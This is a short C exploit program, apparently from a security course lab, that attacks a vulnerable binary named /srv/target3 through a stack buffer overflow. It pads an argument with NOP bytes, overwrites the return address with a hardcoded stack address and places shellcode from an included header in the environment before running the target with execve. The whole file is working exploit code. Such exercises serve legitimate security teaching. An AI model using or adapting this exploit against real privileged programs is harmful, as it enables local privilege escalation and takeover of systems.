#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);

  // Buffer 16 bytes of NOPs
  for (int i = 0; i < 16; i++)
  {
  	strcat(str, "\x90");
  }

  // Return Address here: 0xffffdf80 -> aligned address, start of environment variable / shellcode (p &argc[3] at main)
  strcat(str, "\x80\xdf\xff\xff");

  args[0] = TARGET;
  args[1] = str; 
  args[2] = NULL;
  
  // Shellcode as environment variable since buffer is too small and will overflow
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


